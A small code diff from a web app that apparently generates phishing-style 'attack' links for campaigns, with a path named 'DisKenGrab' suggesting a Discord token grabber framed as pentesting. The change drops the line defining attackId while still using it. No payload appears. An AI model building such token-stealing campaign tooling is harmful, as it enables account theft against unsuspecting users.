@@ -1747,10 +1747,7 @@
             showLoading(this, spinner);
 
             try {
-                // Generate unique attack URL
-                const attackId = generateId();
-                const attackUrl = `${window.location.origin}/attack.html?id=${attackId}&pentester=${currentUser.uid}`;
-
+                const attackUrl = `${window.location.origin}/DisKenGrab/attack.html?id=${attackId}&pentester=${currentUser.uid}`;
                 // Save campaign to database
                 await db.collection('campaigns').doc(attackId).set({
                     name: campaignName,
